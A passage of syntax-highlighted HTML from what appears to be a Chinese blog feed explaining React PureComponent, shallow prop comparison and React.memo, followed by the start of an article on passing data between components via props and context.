class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初次渲染的效果图与输出如下，页面初始化时普通组件与纯组件都会进行一次渲染：</p><p><img src="https://img-blog.csdnimg.cn/20210509121150531.png" alt="1"></p><p>第一次和第二次点击按钮后，可以看到都只有普通组件触发了渲染，即使组件每次接收的 <code>props</code> 值 <code>count</code> 都没有发生变化：</p><p><img src="https://img-blog.csdnimg.cn/20210509121240758.png" alt="2"></p><p><img src="https://img-blog.csdnimg.cn/20210509125010295.png" alt="3"></p><p>在第三次点击按钮后，由于 <code>props</code> 的传入值发生了改变，因此纯组件也触发了重渲染，页面内容正常更新：</p><p><img src="https://img-blog.csdnimg.cn/20210509125340917.png" alt="4"></p><h3 id="子组件更新问题"><a href="#子组件更新问题" class="headerlink" title="子组件更新问题"></a>子组件更新问题</h3><p>可以看到 <code>PureComponent</code> 确实可以在传入 <code>props</code> 值没有变化时避免重新渲染，在一些场景下优化性能，但是这也是使用 <code>PureComponent</code> 的一个前提，即需要组件在相同 <code>props</code> 传入值的情况下总会有相同的渲染内容，也就是纯组件中 <code>Pure</code> 的含义所在，它有些类似<strong>纯函数</strong>的定义（传入相同的参数执行后，总会得到相同的返回值）；</p><p>从另一个方面来说，就是 <code>PureComponent</code> 跳过渲染时，它的所有<strong>子组件</strong>也会跳过渲染，即使子组件应被更新，所以需要保证纯组件的所有子组件也都是纯组件；举个例子，下面的纯组件包含一个展示当前时间的子组件：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">class</span> <span class="token class-name">Counter</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>Component <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span> count<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> float<span class="token operator">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span> textAlign<span class="token operator">:</span> <span class="token string">'right'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">></span>        <span class="token operator">&lt;</span>div<span class="token operator">></span>count<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>ConstText count<span class="token operator">=</span><span class="token punctuation">&#123;</span>count <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">?</span> count <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> count<span class="token operator">:</span> count <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">></span>Add<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// “纯”组件</span><span class="token keyword">class</span> <span class="token class-name">ConstText</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>PureComponent <span class="token punctuation">&#123;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>    <span class="token keyword">const</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> time <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>d<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>d<span class="token punctuation">.</span><span class="token function">getMinutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>d<span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pure rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token operator">&lt;</span>div<span class="token operator">></span>        pure<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span>        <span class="token operator">&lt;</span>ConstChild time<span class="token operator">=</span><span class="token punctuation">&#123;</span>time<span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 展示时间的子组件</span><span class="token keyword">class</span> <span class="token class-name">ConstChild</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>Component <span class="token punctuation">&#123;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> time <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'child rendered'</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">&#123;</span>time<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页面初始化时：</p><p><img src="https://img-blog.csdnimg.cn/20210509133437250.png" alt="5"></p><p>前两次点击按钮后：</p><p><img src="https://img-blog.csdnimg.cn/20210509133505131.png" alt="6"></p><p><img src="https://img-blog.csdnimg.cn/20210509133522526.png" alt="7"></p><p>此时纯组件和其子组件都未触发更新，在第三次点击后，才同时触发更新：</p><p><img src="https://img-blog.csdnimg.cn/20210509133559596.png" alt="8"></p><h3 id="浅对比问题"><a href="#浅对比问题" class="headerlink" title="浅对比问题"></a>浅对比问题</h3><p>最开始有提到 <code>PureComponent</code> 是对 <code>props</code> 的变化前后的值进行浅对比来决定是否重渲染组件，实际上就是对每个 <code>props</code> 值进行基本的值对比，如果值类型是复杂类型，如引用类型（对象），并不会深入遍历每个属性的变化，下面改造一下上面的示例，让传入纯组件的 <code>props</code> 变成一个引用对象：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">class</span> <span class="token class-name">Counter</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>Component <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span> count<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span> num<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">handleAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> newCount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> count<span class="token operator">:</span> newCount <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>obj<span class="token punctuation">.</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> newCount<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Counter rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> float<span class="token operator">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span> textAlign<span class="token operator">:</span> <span class="token string">'right'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">></span>        <span class="token operator">&lt;</span>div<span class="token operator">></span>count<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>ConstText count<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>obj<span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">></span>Add<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">ConstText</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>PureComponent <span class="token punctuation">&#123;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count<span class="token operator">:</span> <span class="token punctuation">&#123;</span> num<span class="token operator">:</span> <span class="token punctuation">[</span>count<span class="token punctuation">]</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pure rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>pure<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首次初始化后的结果：</p><p><img src="https://img-blog.csdnimg.cn/20210509140040488.png" alt="9"></p><p>依次点击三次后的结果：</p><p><img src="https://img-blog.csdnimg.cn/20210509140105603.png" alt="10"></p><p><img src="https://img-blog.csdnimg.cn/20210509140144675.png" alt="11"></p><p><img src="https://img-blog.csdnimg.cn/2021050914021458.png" alt="12"></p><p>可以看到其实每次传入纯组件的 <code>props</code> 的实际值都有发生变化，但是由于是引用类型，所以组件并没有识别到这一变化，永远跳过了组件更新；因此如果遇到复杂数据结构的情况，尽量使用 <code>state</code>，因为 <code>state</code> 由于自身的特性和规则，每次变化后的值都是一个全新的值；</p><p>当然，还有一种特殊情况，如果在组件中使用了 <strong>Render prop</strong> 或类似的形式，即 <code>props</code> 的值是一个返回某个值的函数，如：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token operator">&lt;</span>Counter count<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">3</span><span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么即使每次函数实际执行的值都是相同的，也都会触发渲染，因为这个函数本身每次都会被判断为一个<strong>新值</strong>，使得性能优化<strong>失效</strong>；</p><h2 id="React-memo"><a href="#React-memo" class="headerlink" title="React.memo"></a>React.memo</h2><p><code>React.memo</code> 是一个类似 <code>PureComponent</code> 的高阶组件，只不过它用于<strong>函数组件</strong>，而 <code>PureComponent</code> 用于类（<code>class</code>）组件，但二者的实际展示与优化效果是一致的，下面是两种组件形式的写法：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// 类组件</span><span class="token keyword">class</span> <span class="token class-name">ConstText1</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>PureComponent <span class="token punctuation">&#123;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pure rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>pure<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 函数组件</span><span class="token keyword">const</span> ConstText2 <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">memo</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> props<span class="token punctuation">;</span>  <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'const rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> react purecomponent 性能优化 组件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 组件间传值的几种情形</title>
      <link href="/2024/09/27/javascript/react-zu-jian-jian-chuan-zhi-de-ji-chong-qing-xing/"/>
      <url>/2024/09/27/javascript/react-zu-jian-jian-chuan-zhi-de-ji-chong-qing-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="父级传向子级"><a href="#父级传向子级" class="headerlink" title="父级传向子级"></a>父级传向子级</h2><p>这应该是最常见的一种场景，通过在子组件上写 <code>props</code>，将数据从父组件中传递到子组件，子组件再从 <code>this.props</code> 中获取相应的值，这样可以根据传入值的不同返回不同的状态，即实现组件的复用；例如：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token comment">// 父组件</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    message <span class="token operator">=</span> <span class="token string">'Hello world!'</span><span class="token punctuation">;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Child</span></span> <span class="token attr-name">myProp</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span></span> <span class="token punctuation">/></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 子组件</span><span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    message <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>myProp<span class="token punctuation">;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Hello world!</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多层传值"><a href="#多层传值" class="headerlink" title="多层传值"></a>多层传值</h3><p>上述方法只用于单层数据传递，即父级传向子级，如果子级又存在子级，甚至向下递推，那么父组件要传值给后代组件，就要逐层向下传递，类似下面的情况：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Child</span></span> <span class="token attr-name">myProp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hello<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Grandchild</span></span> <span class="token attr-name">myProp1</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>myProp<span class="token punctuation">&#125;</span></span> <span class="token punctuation">/></span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Grandchild</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// hello</span>        <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>myProp1<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果层数再多一些就是书写噩梦了，所以 React 提供了 <code>context</code> 机制，解决了深层传值的问题，现在来改造上面的代码：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> Reac <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token comment">// 首先需要创建一个自定义 context</span><span class="token comment">// 该方法接收一个参数作为 context 的默认值</span><span class="token keyword">const</span> myContext <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取包裹组件，用于包裹需要应用 context 的组件</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> Provider <span class="token punctuation">&#125;</span> <span class="token operator">=</span> myContext<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    value <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 通过包裹器的 value 属性向下传递指定值</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Provider</span></span> <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">                </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Child</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Provider</span></span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Grandchild</span></span> <span class="token punctuation">/></span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Grandchild</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 在需要获取祖代传递的 context 值的后代组件中，</span>    <span class="token comment">// 声明 contextType 静态属性，值为之前创建的 context;</span>    <span class="token keyword">static</span> contextType <span class="token operator">=</span> myContext<span class="token punctuation">;</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 最后使用 this.context 就能获取到之前</span>        <span class="token comment">// 在 Provider 中传入的 value 值；</span>        <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token comment">// hello</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是，由于提供方和调用方需要使用同一个使用 <code>React.createContext()</code> 创建的 <code>context</code>，所以如果父组件和要调用 context 的子组件不在同一个文件中的话，则需要考虑通过 <code>export</code> 和 <code>import</code> 来实现引用，但是这样组件间的耦合度又增加了一层，React 官方建议使用 <strong>组合</strong> 方式取代上述的 <strong>继承</strong> 方式，下面再次对上述代码进行改造：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    value <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span 